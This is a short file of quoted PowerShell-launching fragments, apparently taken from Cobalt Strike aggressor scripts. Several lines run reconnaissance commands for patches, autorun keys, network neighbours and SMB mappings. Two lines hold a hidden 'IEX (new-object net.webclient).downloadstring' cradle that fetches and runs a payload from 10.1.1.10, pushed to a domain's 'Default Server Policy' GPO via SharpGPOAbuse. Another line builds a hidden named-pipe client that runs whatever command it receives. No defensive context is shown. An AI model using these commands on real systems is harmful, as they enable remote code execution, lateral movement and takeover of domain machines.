"PowerShell.exe""), $arg);"
"PowerShell.exe'), ""Get-HotFix"");"
"PowerShell.exe'), ""Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | ft"");"
"PowerShell.exe'), ""Get-NetIPAddress -All"");"
"PowerShell.exe'), ""Get-NetIPAddress"");"
"PowerShell.exe'), ""Get-NetNeighbor"");"
"PowerShell.exe'), ""Get-NetRoute"");"
"PowerShell.exe'), ""Get-PSDrive"");"
"PowerShell.exe'), ""Get-SmbMapping"");"
"powershell.exe -WindowStyle Hidden -ArgumentList ""Reg unload $Path""		"
"powershell.exe -nop -w hidden -c \""IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"""",GPOName => ""Default Server Policy"",bid => $bid), &SharpGPOAbuse_admin);	"
"powershell.exe -nop -w hidden -c \""IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"""",GPOName => ""Default Server Policy"",bid => $bid), &SharpGPOAbuse_task);"
"powershell.exe"", "" -command $Command"","
"powershell.exe"", "" add-type -assemblyName `'System.Core`';`$npipeClient = new-object System.IO.Pipes.NamedPipeClientStream(`'.`', `'$npipeName`', [System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Impersonation);`$pipeReader = `$pipeWriter = `$null;`$playerName = `'ping`';`$npipeClient.Connect();`$pipeWriter = new-object System.IO.StreamWriter(`$npipeClient);`$pipeReader = new-object System.IO.StreamReader(`$npipeClient);`$pipeWriter.AutoFlush = `$true;`$pipeWriter.WriteLine(`$playerName);IEX `$pipeReader.ReadLine();`$npipeClient.Dispose();"","
